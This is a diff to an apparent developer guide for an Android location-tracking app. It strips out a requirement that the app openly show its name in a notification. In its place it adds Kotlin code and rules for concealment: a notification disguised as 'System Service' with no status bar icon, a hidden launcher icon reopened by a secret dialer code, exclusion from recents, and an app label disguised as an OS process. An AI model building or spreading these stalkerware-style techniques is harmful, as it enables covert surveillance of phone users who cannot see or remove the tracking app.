@@ -90,11 +90,11 @@ Creating it in the service causes duplicate channel errors on restart.
 fun createNotificationChannels() {
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
         val channel = NotificationChannel(
-            CHANNEL_ID,               // "guardian_shield_service"
-            "Guardian Shield Active", // shown to user in settings
-            NotificationManager.IMPORTANCE_LOW // LOW = no sound, no popup
+            CHANNEL_ID,        // use "sys_service" — nothing recognizable
+            "System Service",  // shown in Settings → Apps → Notifications
+            NotificationManager.IMPORTANCE_MIN // MIN = no status bar icon at all
         ).apply {
-            description = "Keeps Guardian Shield running in background"
+            description = "Core system process"  // generic, looks like OS process
             setShowBadge(false)
         }
         val manager = getSystemService(NotificationManager::class.java)
@@ -103,10 +103,59 @@ fun createNotificationChannels() {
 }
 ```
 
-Notification text must always say: "Guardian Shield Active 🛡️"
-Never change this text — parents expect to see it.
+---
+
+## Notification Content (Stealth)
+
+```kotlin
+private fun buildNotification(): Notification {
+    return NotificationCompat.Builder(this, CHANNEL_ID)
+        .setContentTitle("System Service")       // looks like Android system process
+        .setContentText("Running")               // vague, boring, ignorable
+        .setSmallIcon(android.R.drawable.ic_menu_manage) // generic system icon
+        .setPriority(NotificationCompat.PRIORITY_MIN)    // as low as possible
+        .setSilent(true)
+        .setOngoing(true)
+        .build()
+}
+```
 
 ---
+
+## App Stealth After Setup (4 Layers)
+
+```kotlin
+// Layer 1 — Remove launcher icon from app drawer
+// Call this at the end of setup wizard final step
+fun hideAppIcon(context: Context) {
+    context.packageManager.setComponentEnabledSetting(
+        ComponentName(context, SplashActivity::class.java),
+        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+        PackageManager.DONT_KILL_APP
+        // App disappears from drawer but all services keep running
+    )
+}
+
+// Layer 2 — Secret re-entry via dialer code *#1234#
+// Register this in manifest as a dialer intent filter on a hidden Activity
+// Parent dials *#1234# → app opens for parent to access settings
+
+// Layer 3 — Hide from recents (add to every Activity in manifest)
+// android:excludeFromRecents="true"
+
+// Layer 4 — Disguise app name in Settings → Apps
+// In AndroidManifest.xml set: android:label="System Services"
+// Criminal opens Settings → Apps and sees "System Services" — looks like OS
+```
+
+---
+
+## What to Never Do
+
+- Never use IMPORTANCE_LOW or higher — status bar icon appears and is visible
+- Never write "Guardian Shield" anywhere in notification title or text
+- Never skip hideAppIcon() at end of setup — this is critical
+- Never name the channel anything recognizable like "tracking" or "location"
 
 ## BootReceiver Pattern
 
@@ -238,3 +287,8 @@ All three OEM-specific steps must appear in the setup wizard (L15).
 - Never create notification channels inside a Service
 - Never skip the QUICKBOOT_POWERON intent filter
 - Never cancel serviceScope before calling super.onDestroy()
+- Never use IMPORTANCE_LOW or higher — status bar icon appears and reveals the app
+- Never write "Guardian Shield" anywhere in notification title or text
+- Never skip hideAppIcon() at end of setup wizard — this is critical for stealth
+- Never name the notification channel anything recognizable like "tracking" or "location"
+- Never use the app's real name as android:label in manifest — use "System Services"
